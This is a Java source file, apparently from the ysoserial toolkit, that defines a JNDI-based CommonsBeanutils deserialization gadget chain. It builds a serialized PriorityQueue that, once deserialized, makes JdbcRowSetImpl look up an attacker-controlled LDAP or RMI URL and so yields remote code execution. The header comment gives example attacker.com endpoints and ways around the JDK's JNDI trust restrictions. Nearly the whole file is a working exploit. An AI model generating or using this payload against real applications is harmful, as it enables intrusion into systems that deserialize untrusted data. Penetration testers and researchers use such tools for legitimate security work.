package ysoserial.payloads;

import java.util.PriorityQueue;

import javax.sql.rowset.JdbcRowSet;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JNDI-based variant of CommonsBeanutils1. Works on JDK 17+ without
	TemplatesImpl or --add-opens flags. RCE requires a reachable JNDI
	server (LDAP/RMI) serving malicious objects.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				BeanComparator.compare()
					PropertyUtils.getProperty(jdbcRowSet, "databaseMetaData")
						JdbcRowSetImpl.getDatabaseMetaData()
							JdbcRowSetImpl.connect()
								InitialContext.lookup(dataSourceName)
									JNDI → LDAP/RMI → RCE

	Usage: command = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"
		     "rmi://attacker.com:1099/Exploit"

	JDK restrictions on JNDI:
		- JDK 8u121+: com.sun.jndi.rmi.object.trustURLCodebase=false
		- JDK 8u191+: com.sun.jndi.ldap.object.trustURLCodebase=false
		- Bypass: use local factory gadgets (e.g., Tomcat BeanFactory)

	Requires:
		commons-beanutils (no commons-collections needed)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutilsJndi extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(final String jndiUrl) throws Exception {
		// JdbcRowSetImpl with attacker-controlled dataSource JNDI URL
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		// setAutoCommit(true) triggers connect() immediately — use reflection to avoid
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new java.util.Vector<Integer>(java.util.Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new java.util.Vector<String>(java.util.Arrays.asList("","","","","","","","","","")));

		// CB1 outer chain: property="databaseMetaData" calls getDatabaseMetaData()
		// which internally calls connect() → InitialContext.lookup(dataSourceName)
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = jdbcRowSet;
		queueArray[1] = jdbcRowSet;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsJndi.class, args);
	}
}
